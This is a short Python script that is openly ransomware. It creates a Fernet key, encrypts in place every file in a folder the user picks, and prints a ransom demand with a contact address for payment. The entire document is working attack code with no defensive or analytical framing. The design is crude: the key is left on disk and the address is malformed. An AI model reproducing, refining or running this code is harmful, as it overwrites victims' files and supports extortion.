import os
import tkinter as tk
from tkinter import filedialog
from cryptography.fernet import Fernet

def generate_key():
    key = Fernet.generate_key()
    with open("encryption_key.txt", "wb") as key_file:
        key_file.write(key)

def encrypt_file(file_path, key):
    fernet = Fernet(key)
    with open(file_path, "rb") as file:
        plaintext = file.read()
    encrypted_data = fernet.encrypt(plaintext)
    with open(file_path, "wb") as file:
        file.write(encrypted_data)

def ransomware_attack():
    generate_key()

    root = tk.Tk()
    root.withdraw()
    target_directory = filedialog.askdirectory(title="Select Target Directory")

    with open("encryption_key.txt", "rb") as key_file:
        key = key_file.read()
    for filename in os.listdir(target_directory):
        file_path = os.path.join(target_directory, filename)
        if os.path.isfile(file_path):
            encrypt_file(file_path, key)

    print("Your files have been encrypted. Pay the ransom to get the decryption key.")
    print("Contact hacker@.com for payment instructions.")
    print("Your unique encryption key has been saved in 'encryption_key.txt'. Keep it safe.")

if __name__ == "__main__":
    ransomware_attack()
